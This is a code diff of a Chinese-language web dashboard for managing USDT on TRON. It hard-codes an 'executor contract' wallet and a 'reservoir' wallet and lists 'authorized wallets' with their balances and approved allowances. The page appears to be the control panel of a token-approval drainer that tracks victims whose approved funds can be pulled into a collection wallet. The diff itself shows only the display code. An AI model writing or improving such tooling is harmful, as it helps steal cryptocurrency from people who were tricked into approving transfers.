@@ -6,17 +6,18 @@
     <title>USDT管理面板</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
+            margin: 0;
+            padding: 20px;
             background: #f5f5f5;
+            font-family: Arial, sans-serif;
         }
 
-        .system-status {
+        .system-info {
             background: white;
             padding: 15px;
-            border-radius: 8px;
             margin-bottom: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .warning {
@@ -24,103 +25,110 @@
             font-weight: bold;
         }
 
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-bottom: 15px;
+        .wallet-section {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
         }
 
-        .status-item {
-            background: #f8f9fa;
-            padding: 12px;
-            border-radius: 6px;
-            border: 1px solid #dee2e6;
+        .wallet-icon {
+            font-size: 24px;
+            margin-right: 10px;
         }
 
-        .status-item h3 {
-            margin: 0 0 8px 0;
-            color: #2d3436;
+        .saved-wallets {
+            background: white;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
 
         .wallet-list {
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-top: 15px;
         }
 
         .wallet-item {
             padding: 10px;
             border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
         }
 
         .wallet-item:last-child {
             border-bottom: none;
         }
 
-        .refresh-button {
+        .refresh-btn {
             background: #4834d4;
             color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
+            padding: 8px 15px;
+            border-radius: 4px;
             cursor: pointer;
-            margin-bottom: 20px;
+            float: right;
         }
 
-        .refresh-button:hover {
+        .refresh-btn:hover {
             background: #686de0;
         }
 
-        .address {
-            font-family: monospace;
-            color: #2d3436;
+        .copy-btn {
+            padding: 3px 8px;
+            background: #f1f2f6;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            margin-left: 5px;
         }
 
-        .balance {
-            font-weight: bold;
-            color: #00b894;
+        .copy-btn:hover {
+            background: #dfe4ea;
         }
 
-        @media (max-width: 768px) {
-            .status-grid {
-                grid-template-columns: 1fr;
-            }
+        .delete-btn {
+            color: #e74c3c;
+            background: none;
+            border: none;
+            cursor: pointer;
+            float: right;
         }
     </style>
 </head>
 <body>
-    <button class="refresh-button" onclick="refreshData()">刷新數據</button>
-
-    <div class="system-status">
-        <h2>系統狀態</h2>
-        <div class="status-grid">
-            <div class="status-item">
-                <h3>發動合約錢包</h3>
-                <div class="address" id="executor-address"></div>
+    <div class="system-info">
+        <h3>系統狀態</h3>
+        <div class="wallet-section">
+            <div>
+                <strong>發動合約錢包：</strong>
+                <span id="executor-address">THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR</span>
                 <div id="executor-balance"></div>
             </div>
-            <div class="status-item">
-                <h3>水庫錢包</h3>
-                <div class="address" id="receiver-address"></div>
+        </div>
+        <div class="wallet-section">
+            <div>
+                <strong>水庫錢包：</strong>
+                <span id="receiver-address">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</span>
                 <div id="receiver-balance"></div>
             </div>
         </div>
     </div>
 
-    <div class="wallet-list" id="wallet-list">
-        <h2>已授權錢包</h2>
-        <!-- 錢包列表將在這裡動態生成 -->
+    <div class="saved-wallets">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+            <div class="wallet-section">
+                <span class="wallet-icon">👛</span>
+                <span>已保存錢包</span>
+                <span id="wallet-count" style="margin-left: 10px; background: #4834d4; color: white; padding: 2px 8px; border-radius: 10px;">1</span>
+            </div>
+            <button class="refresh-btn" onclick="refreshAllBalances()">刷新所有餘額</button>
+        </div>
+        <div id="wallet-list" class="wallet-list">
+            <!-- 錢包列表將在這裡動態生成 -->
+        </div>
     </div>
 
     <script>
         const API_BASE_URL = 'http://localhost:3000'; // 請根據實際情況修改
 
-        async function refreshData() {
+        async function refreshAllBalances() {
             try {
                 const response = await fetch(`${API_BASE_URL}/authorized-wallets`);
                 const data = await response.json();
@@ -129,56 +137,65 @@
                 updateSystemStatus(data.systemStatus);
 
                 // 更新錢包列表
-                updateWalletList(data.wallets);
+                const walletList = document.getElementById('wallet-list');
+                document.getElementById('wallet-count').textContent = data.wallets.length;
+
+                const walletsHtml = data.wallets.map(wallet => `
+                    <div class="wallet-item">
+                        <div>
+                            ${wallet.address}
+                            <button class="copy-btn" onclick="copyToClipboard('${wallet.address}')">複製</button>
+                            <button class="delete-btn" onclick="deleteWallet('${wallet.address}')">❌</button>
+                        </div>
+                        <div style="margin-top: 5px; color: #666;">
+                            餘額: ${wallet.balance} USDT
+                            <span style="margin-left: 15px;">授權額度: ${wallet.allowance}</span>
+                        </div>
+                    </div>
+                `).join('');
+
+                walletList.innerHTML = walletsHtml;
             } catch (error) {
-                console.error('Error fetching data:', error);
-                alert('獲取數據失敗，請重試');
+                console.error('Error:', error);
             }
         }
 
         function updateSystemStatus(status) {
             // 更新發動合約錢包狀態
-            document.getElementById('executor-address').textContent = status.executor.address;
             const executorBalance = document.getElementById('executor-balance');
             if (status.executor.lowTrxBalance) {
                 executorBalance.className = 'warning';
                 executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance} (餘額過低，請充值！)`;
             } else {
-                executorBalance.className = 'balance';
-                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance}`;
+                executorBalance.className = '';
+                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance} TRX`;
             }
 
             // 更新水庫錢包狀態
-            document.getElementById('receiver-address').textContent = status.receiver.address;
             document.getElementById('receiver-balance').textContent = 
-                `USDT餘額: ${status.receiver.usdtBalance}`;
+                `USDT餘額: ${status.receiver.usdtBalance} USDT`;
         }
 
-        function updateWalletList(wallets) {
-            const walletList = document.getElementById('wallet-list');
-            const walletsHtml = wallets.map(wallet => `
-                <div class="wallet-item">
-                    <div>
-                        <div class="address">${wallet.address}</div>
-                        <div>USDT餘額: ${wallet.balance}</div>
-                    </div>
-                    <div>
-                        <div>授權額度: ${wallet.allowance}</div>
-                    </div>
-                </div>
-            `).join('');
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('已複製到剪貼板');
+            }).catch(err => {
+                console.error('複製失敗:', err);
+            });
+        }
 
-            walletList.innerHTML = `
-                <h2>已授權錢包</h2>
-                ${walletsHtml}
-            `;
+        function deleteWallet(address) {
+            if (confirm('確定要刪除這個錢包嗎？')) {
+                // 實現刪除邏輯
+                console.log('刪除錢包:', address);
+            }
         }
 
         // 頁面加載時自動刷新數據
-        document.addEventListener('DOMContentLoaded', refreshData);
+        document.addEventListener('DOMContentLoaded', refreshAllBalances);
 
         // 每30秒自動刷新一次
-        setInterval(refreshData, 30000);
+        setInterval(refreshAllBalances, 30000);
     </script>
 </body>
 </html>
